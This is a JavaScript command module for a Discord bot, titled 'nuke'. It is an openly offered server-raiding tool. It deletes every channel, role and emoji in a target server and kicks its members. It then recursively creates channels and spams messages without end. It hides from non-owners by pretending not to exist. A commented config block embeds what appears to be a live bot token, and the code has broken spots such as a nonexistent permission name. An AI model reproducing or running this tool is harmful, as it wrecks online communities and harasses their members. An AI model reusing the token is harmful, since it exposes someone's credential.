const Discord = require("discord.js")
module.exports = {
    name: "nuke",
    aliases: [],
    permission: [],
    category: "info",
    description: "nuke a server",
    usage: ["$nuke <serverid>"],
    run: async (client, message, args, config) => {
        if (!config.owners.includes(message.author.id)) return message.reply({content: "That command doesnt exist"})

        /*
{
  "token": "ODQ0NTQ3MDgwNDI4MDYwNzEy.GES3My.rJrqm1f2MLDkF1NDUvd9lqek2tmlx5Q-XxRpco",
  "prefix": "mm",
  "owners": ["877168141355065404"],
  "message_to_send_in_each_channel": "get nuked test",
  "channel_name_to_create": "Nuked",
  "delete_all_channels": true,
  "delete_all_roles": true,
  "delete_all_emojis_and_stickers": true,
  "kick_all_bots_if_possible": true,
  "kick_all_members_if_possible": true
}
    */


        if (message.guild) return;
        let guildid = args[0]
        if (!guildid) return message.reply({
            content: "Must specify a guild id"
        })
        let guild = client.guilds.cache.get(guildid)
        if (!guild) return message.reply({
            content: "Guild not found"
        })
      message.channel.send({content: `Nuking ${guild.name}`})
        let req_perms = []
        let functions = {
            "delete_all_channels": function() {
  let channels = guild.channels
  channels.cache.forEach(channel => {
    try{
      guild.channels.delete(channel, "why not").catch(err => {
        return
      })
    } catch{}
  })
            },
            "delete_all_emojis_and_stickers": function() {
                let emojis_and_stickers = []
                guild.emojis.cache.forEach(emoji => {
                    emojis_and_stickers.push({
                        content: emoji,
                        type: "emoji"
                    })
                })
                guild.stickers.cache.forEach(sticker => {
                    emojis_and_stickers.push({
                        content: sticker,
                        type: "sticker"
                    })
                })
                emojis_and_stickers.forEach(es => {
                    if (es.type == "emoji") {
                        guild.emojis.delete(es.content, "why not").catch(err => {
                          return
                        })
                    } else {
                        guild.emojis.delete(es.content, "why not").catch(err => {
                          return
                        })
                    }
                })
            },
            "delete_all_roles": function() {
                guild.roles.cache.forEach(role => {
                    
                        guild.roles.delete(role, "why not").catch(err => {
                          return
                        })
                       
                })
            },
            "kick_all_bots_if_possible": function() {
              let bots = guild.members.cache.filter(m => m.user.bot)
              bots.forEach(bot => {
                  bot.kick().catch(err => {
                          return
                        })
                })
            },
            "kick_all_members_if_possible": function() {
              let members = guild.members.cache.filter(m => !m.user.bot)
              members.forEach(member => {
                  member.kick().catch(err => {
                          return
                        })
                })
            },
        }
        let all_configs = [{
                event: config.delete_all_channels,
                func: "delete_all_channels",
                perm: "MANAGE_CHANNELS"
            },
            {
                event: config.delete_all_emojis_and_stickers,
                func: "delete_all_emojis_and_stickers",
                perm: "MANAGE_EMOJIS_AND_STICKERS"
            },
            {
                event: config.delete_all_roles,
                func: "delete_all_roles",
                perm: "MANAGE_ROLES"
            },
            {
                event: config.kick_all_bots_if_possible,
                func: "kick_all_bots_if_possible",
                perm: "MANAGE_MEMBERS"
            },
            {
                event: config.kick_all_members_if_possible,
                func: "kick_all_members_if_possible",
                perm: "MANAGE_MEMBERS"
            }
        ]
        for (let c of all_configs) {
          
            if (c.event == true) {
                req_perms.push(c.perm)
            }
        }
        for (const perm of req_perms) {
            if (!guild.me.permissions.has(perm)) return message.reply({
                content: `I am missing the following permission: \`${perm}\`, please disable the correlating configurations for this permission`
            })
        }
        all_configs.forEach(c => {
            if (c.event == true) {
                functions[c.func]()
            }
        })
      function delay(time) {
        return new Promise(resolve => setTimeout(resolve, time));
      }
      let channelstosend = []
      
      async function nuke(){
        
        while(true){
          
            await delay(1)
            let channel = await guild.channels.create(config.channel_name_to_create, { reason: 'Needed a cool new channel' }).then(chnl => {
              setInterval(function(){
                chnl.send({content: `${config.message_to_send_in_each_channel}`}).catch(err => {
                  return;
                })
              },4000)
            }).catch(err => {
              return;
            })
            
          nuke()
          }
      }
      
      nuke()
    },
}